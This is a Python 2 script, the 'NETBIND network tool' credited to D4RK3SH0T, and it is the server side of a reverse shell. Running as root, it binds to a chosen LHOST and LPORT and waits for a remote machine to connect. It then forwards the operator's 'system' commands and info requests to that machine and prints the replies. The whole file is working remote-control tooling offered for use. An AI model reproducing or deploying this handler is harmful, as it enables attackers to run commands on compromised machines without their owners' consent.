#!/usr/bin/python
import os,socket,argparse,sys
'''
 _       ____  _    _     _  _          _
| |____ |  __|| |_ | |    _ | |____    | |
|  __  ||  __||  _|| |__ | ||  __  | __| |
| |  | || |__ | |  | __ || || |  | || __ |
|_|  |_||____||_|  |____||_||_|  |_||____|
---------------------------------------------
#THE NETBIND network tool
#Author  : D4RK3SH0T
#Github  : https://github.com/D4RK3SHOT
#Twitter : https://twitter.com/D4Rk3Sh0T
#Licence : Open-Source
'''
def Arg_Parser():
    parser = argparse.ArgumentParser(description="NETBIND SERVER")
    parser.add_argument('--LHOST',type=str,required=True,help='Local Host (server adress)')
    parser.add_argument('--LPORT',type=int,required=True,help='Local Port (server port)')
    args = parser.parse_args()
    HOST = args.LHOST
    PORT = args.LPORT
    Server(HOST,PORT)
def Server(LHOST,LPORT):
    try:
        print("\n\033[92m[~] LHOST ==> %s\033[0m" % LHOST)
        print("\033[92m[~] LPORT ==> %s\033[0m\n" % str(LPORT))
        connector = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connector.bind((LHOST,LPORT))
        connector.listen(10)
        print("[~] Serving on %s:%s..." %(LHOST,str(LPORT)))
        connection, address = connector.accept()
        print("[~] Connection from: %s:%s" %(address[0],address[1]))
        post_connection(connection,address[0])
    except KeyboardInterrupt:
        print("\n\033[91m[~] Interrupted!\033[0m")
    except socket.error:
        print("[~] Network error !")
    except Exception as error:
        print("[~] Internal error occured!")
def post_connection(connection,address):
    print("[~] RHOST: %s" %(address))
    while True:
        shell = raw_input("NETBIND(\033[91m%s\033[0m):> " % (address))
        if(shell == "exit"):
            connection.send("disconnect")
            connection.close()
            sys.exit("[~] Session closed !")
        elif(shell == "help"):
            print('''
Commands:
---------
get <option>
system <command>
Options:
--------
infos: machine infos
dir  : working directory
''')
        else:
            connection.send(shell)
            response = connection.recv(4096)
            print(response)
if(os.getuid() == 0):
    Arg_Parser()
else:
    print("[~] root permission required!")
